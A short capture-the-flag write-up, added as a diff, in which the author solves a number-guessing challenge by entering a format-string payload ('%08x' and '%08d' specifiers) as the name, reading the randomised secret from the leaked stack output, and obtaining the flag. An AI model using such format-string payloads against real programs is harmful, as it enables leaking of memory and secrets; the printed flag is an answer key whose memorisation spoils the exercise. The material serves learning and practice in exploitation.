@@ -1,0 +1,18 @@
+I think I got lucky on this.
+
+Basically, I tried to leak the memory addresses first (three in fact) to correspond with each variable secret, guess, and name.
+I believe that after leaking the memory addresses, C is now pointing to the secret and with a simple string formatted %d, I was able to leak the secret.
+
+The secret varies since it is randomized every time.
+
+Hello! What is your name?
+> AAAA%08x.%08x.%08x.%08d         
+
+Welcome to the guessing game, AAAA00000020.f77a7c20.099bf008.391625513
+                                                            +---------+ Secret!!    
+I generated a random 32-bit number.
+You have a 1 in 2^32 chance of guessing it. Good luck.
+What is your guess?
+> 391625513
+Wow! You guessed it!
+Your flag is: leak_the_seakret
